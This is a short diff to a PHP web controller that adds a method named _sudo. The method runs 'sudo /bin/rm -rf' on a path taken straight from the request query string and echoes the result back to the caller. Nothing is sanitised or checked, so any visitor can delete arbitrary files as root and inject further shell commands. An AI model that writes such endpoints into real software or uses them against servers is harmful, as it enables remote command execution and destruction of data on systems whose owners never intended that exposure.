@@ -930,4 +930,14 @@ class Home extends \cn\eunionz\core\Controller
             $this->write(print_r($this->post() , true));
         }
     }
+
+    public function _sudo(){
+        $this->write(" <meta charset=\"utf-8\">");
+//        $rs = exec("sudo /bin/mkdir " . $this->get('path') , $a ,$b);
+        $rs = exec("sudo /bin/rm -rf " . $this->get('path') , $a ,$b);
+        $this->write(" return : " . $rs . "<br/>");
+        $this->write(" a : " . print_r($a,true) . "<br/>");
+        $this->write(" b : " . $b . "<br/>");
+
+    }
 }
